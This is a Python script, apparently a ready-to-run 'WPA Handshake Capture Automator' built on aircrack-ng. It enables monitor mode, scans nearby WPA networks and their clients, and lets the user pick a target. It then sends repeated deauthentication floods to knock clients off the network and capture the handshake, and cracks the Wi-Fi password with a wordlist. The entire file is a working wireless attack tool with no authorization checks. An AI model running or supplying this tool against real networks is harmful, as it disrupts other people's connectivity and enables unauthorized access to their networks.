#!/usr/bin/env python3
import subprocess
import os
import time
import re
from datetime import datetime
import threading
import signal
import sys

class WPAHandshakeCapture:
    def __init__(self):
        self.interface = None
        self.monitor_mode = False
        self.target_bssid = None
        self.target_channel = None
        self.capture_file = None
        self.networks = []
        self.clients = {}
        self.processes = []
        self.handshake_captured = False
        
    def check_requirements(self):
        required = ['airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng']
        missing = []
        for tool in required:
            try:
                subprocess.run([tool, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
            except:
                missing.append(tool)
        return missing
    
    def get_interfaces(self):
        try:
            result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
            interfaces = []
            for line in result.stdout.split('\n'):
                if 'wlan' in line.lower() or 'wifi' in line.lower():
                    parts = line.split()
                    if parts:
                        interfaces.append(parts[0])
            return interfaces
        except:
            return []
    
    def enable_monitor_mode(self, interface):
        try:
            subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
            result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)
            for line in result.stdout.split('\n'):
                if 'monitor mode' in line.lower() and 'enabled' in line.lower():
                    match = re.search(r'(wlan\d+mon|mon\d+)', line)
                    if match:
                        self.interface = match.group(1)
                        self.monitor_mode = True
                        return True
            self.interface = f"{interface}mon"
            self.monitor_mode = True
            return True
        except:
            return False
    
    def disable_monitor_mode(self):
        if self.interface and self.monitor_mode:
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
                self.monitor_mode = False
            except:
                pass
    
    def scan_networks(self, duration=30):
        print(f"\033[93m[*] Scanning for networks ({duration}s)...\033[0m\n")
        
        scan_file = f"/tmp/scan_{int(time.time())}"
        
        cmd = ['airodump-ng', self.interface, '-w', scan_file, '--output-format', 'csv']
        
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.processes.append(proc)
        
        time.sleep(duration)
        proc.terminate()
        proc.wait(timeout=5)
        
        try:
            csv_file = f"{scan_file}-01.csv"
            if os.path.exists(csv_file):
                with open(csv_file, 'r', encoding='latin-1') as f:
                    content = f.read()
                
                lines = content.split('\n')
                in_ap_section = False
                in_client_section = False
                
                for line in lines:
                    if 'BSSID' in line and 'PWR' in line:
                        in_ap_section = True
                        in_client_section = False
                        continue
                    elif 'Station MAC' in line:
                        in_ap_section = False
                        in_client_section = True
                        continue
                    
                    if in_ap_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14 and ':' in parts[0]:
                            bssid = parts[0]
                            pwr = parts[8]
                            beacons = parts[9]
                            data = parts[10]
                            channel = parts[3]
                            encryption = parts[5]
                            essid = parts[13]
                            
                            if essid and bssid and channel.isdigit():
                                self.networks.append({
                                    'bssid': bssid,
                                    'channel': channel,
                                    'encryption': encryption,
                                    'power': pwr,
                                    'essid': essid,
                                    'data': data
                                })
                    
                    elif in_client_section and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 6 and ':' in parts[0]:
                            station = parts[0]
                            bssid = parts[5]
                            if bssid and bssid != '(not associated)':
                                if bssid not in self.clients:
                                    self.clients[bssid] = []
                                self.clients[bssid].append(station)
                
                for f in [f"{scan_file}-01.csv", f"{scan_file}-01.cap"]:
                    if os.path.exists(f):
                        os.remove(f)
        except Exception as e:
            pass
    
    def display_networks(self):
        if not self.networks:
            return False
        
        wpa_networks = [n for n in self.networks if 'WPA' in n['encryption']]
        
        if not wpa_networks:
            print("\033[91m[!] No WPA networks found\033[0m")
            return False
        
        print("\033[92m" + "="*100)
        print("  #  |      BSSID       | CH | PWR |  Data  | Clients |         ESSID         |   Encryption")
        print("="*100 + "\033[0m")
        
        for i, net in enumerate(wpa_networks, 1):
            clients = len(self.clients.get(net['bssid'], []))
            print(f"\033[97m {i:2d}  | {net['bssid']:17s} | {net['channel']:2s} | {net['power']:3s} | "
                  f"{net['data']:6s} | {clients:7d} | {net['essid'][:20]:20s} | {net['encryption']:20s}\033[0m")
        
        return True
    
    def capture_handshake(self, bssid, channel, essid):
        self.target_bssid = bssid
        self.target_channel = channel
        self.capture_file = f"handshake_{essid.replace(' ', '_')}_{int(time.time())}"
        
        print(f"\n\033[93m[*] Target: {essid} ({bssid})\033[0m")
        print(f"\033[93m[*] Channel: {channel}\033[0m")
        print(f"\033[93m[*] Starting capture...\033[0m\n")
        
        capture_cmd = ['airodump-ng', '--bssid', bssid, '-c', channel, '-w', self.capture_file, 
                      '--output-format', 'pcap', self.interface]
        
        capture_proc = subprocess.Popen(capture_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.processes.append(capture_proc)
        
        time.sleep(3)
        
        clients = self.clients.get(bssid, [])
        
        if clients:
            print(f"\033[92m[+] Found {len(clients)} client(s)\033[0m")
            print(f"\033[93m[*] Sending deauth packets...\033[0m\n")
            
            for attempt in range(5):
                for client in clients[:3]:
                    deauth_cmd = ['aireplay-ng', '--deauth', '10', '-a', bssid, '-c', client, self.interface]
                    subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                time.sleep(2)
                
                if self.check_handshake():
                    self.handshake_captured = True
                    break
                
                print(f"\033[97m[*] Attempt {attempt + 1}/5...\033[0m")
        else:
            print(f"\033[93m[!] No clients detected, broadcasting deauth...\033[0m")
            
            for attempt in range(5):
                deauth_cmd = ['aireplay-ng', '--deauth', '20', '-a', bssid, self.interface]
                subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                time.sleep(3)
                
                if self.check_handshake():
                    self.handshake_captured = True
                    break
                
                print(f"\033[97m[*] Attempt {attempt + 1}/5...\033[0m")
        
        capture_proc.terminate()
        capture_proc.wait(timeout=5)
        
        return self.handshake_captured
    
    def check_handshake(self):
        cap_file = f"{self.capture_file}-01.cap"
        if os.path.exists(cap_file):
            try:
                result = subprocess.run(['aircrack-ng', cap_file], 
                                      capture_output=True, text=True, timeout=5)
                if 'handshake' in result.stdout.lower():
                    return True
            except:
                pass
        return False
    
    def crack_handshake(self, wordlist):
        cap_file = f"{self.capture_file}-01.cap"
        
        if not os.path.exists(cap_file):
            print("\033[91m[!] Capture file not found\033[0m")
            return None
        
        if not os.path.exists(wordlist):
            print(f"\033[91m[!] Wordlist not found: {wordlist}\033[0m")
            return None
        
        print(f"\n\033[93m[*] Cracking with wordlist: {wordlist}\033[0m")
        print(f"\033[93m[*] This may take a while...\033[0m\n")
        
        try:
            result = subprocess.run(['aircrack-ng', '-w', wordlist, '-b', self.target_bssid, cap_file],
                                  capture_output=True, text=True)
            
            output = result.stdout
            
            if 'KEY FOUND!' in output:
                match = re.search(r'KEY FOUND! \[ (.+?) \]', output)
                if match:
                    password = match.group(1)
                    return password
        except:
            pass
        
        return None
    
    def cleanup(self):
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                try:
                    proc.kill()
                except:
                    pass
        
        self.disable_monitor_mode()

def run():
    print("\033[92m" + "="*70)
    print("     WPA HANDSHAKE CAPTURE AUTOMATOR")
    print("="*70 + "\033[0m\n")
    
    capture = WPAHandshakeCapture()
    
    def signal_handler(sig, frame):
        print("\n\n\033[93m[!] Interrupted. Cleaning up...\033[0m")
        capture.cleanup()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    missing = capture.check_requirements()
    if missing:
        print(f"\033[91m[!] Missing: {', '.join(missing)}\033[0m")
        print(f"\033[97m[*] Install: apt install aircrack-ng\033[0m")
        return
    
    interfaces = capture.get_interfaces()
    if not interfaces:
        print("\033[91m[!] No wireless interfaces found\033[0m")
        return
    
    print("\033[97mAvailable interfaces:\033[0m")
    for i, iface in enumerate(interfaces, 1):
        print(f"  [{i}] {iface}")
    
    iface_choice = input("\n\033[95m[?] Select interface: \033[0m").strip()
    
    try:
        iface_idx = int(iface_choice) - 1
        if 0 <= iface_idx < len(interfaces):
            selected_iface = interfaces[iface_idx]
        else:
            print("\033[91m[!] Invalid selection\033[0m")
            return
    except:
        print("\033[91m[!] Invalid input\033[0m")
        return
    
    print(f"\n\033[93m[*] Enabling monitor mode on {selected_iface}...\033[0m")
    
    if not capture.enable_monitor_mode(selected_iface):
        print("\033[91m[!] Failed to enable monitor mode\033[0m")
        return
    
    print(f"\033[92m[+] Monitor mode enabled: {capture.interface}\033[0m\n")
    
    scan_time = input("\033[95m[?] Scan duration in seconds (default 30): \033[0m").strip()
    scan_time = int(scan_time) if scan_time.isdigit() else 30
    
    capture.scan_networks(scan_time)
    
    if not capture.display_networks():
        capture.cleanup()
        return
    
    target = input("\n\033[95m[?] Select target network #: \033[0m").strip()
    
    try:
        target_idx = int(target) - 1
        wpa_networks = [n for n in capture.networks if 'WPA' in n['encryption']]
        
        if 0 <= target_idx < len(wpa_networks):
            selected_net = wpa_networks[target_idx]
        else:
            print("\033[91m[!] Invalid selection\033[0m")
            capture.cleanup()
            return
    except:
        print("\033[91m[!] Invalid input\033[0m")
        capture.cleanup()
        return
    
    if capture.capture_handshake(selected_net['bssid'], selected_net['channel'], selected_net['essid']):
        print(f"\n\033[92m[+] HANDSHAKE CAPTURED!\033[0m")
        print(f"\033[97m[*] Saved to: {capture.capture_file}-01.cap\033[0m")
        
        crack = input("\n\033[95m[?] Attempt to crack? (y/n): \033[0m").strip().lower()
        
        if crack == 'y':
            wordlist = input("\033[95m[?] Wordlist path: \033[0m").strip()
            
            password = capture.crack_handshake(wordlist)
            
            if password:
                print(f"\n\033[92m{'='*70}\033[0m")
                print(f"\033[92m[+] PASSWORD FOUND: {password}\033[0m")
                print(f"\033[92m{'='*70}\033[0m")
            else:
                print(f"\n\033[91m[!] Password not found in wordlist\033[0m")
    else:
        print(f"\n\033[91m[!] Failed to capture handshake\033[0m")
        print(f"\033[97m[*] Capture saved to: {capture.capture_file}-01.cap\033[0m")
    
    capture.cleanup()
    print(f"\n\033[92m[+] Cleanup complete\033[0m")

if __name__ == "__main__":
    run()
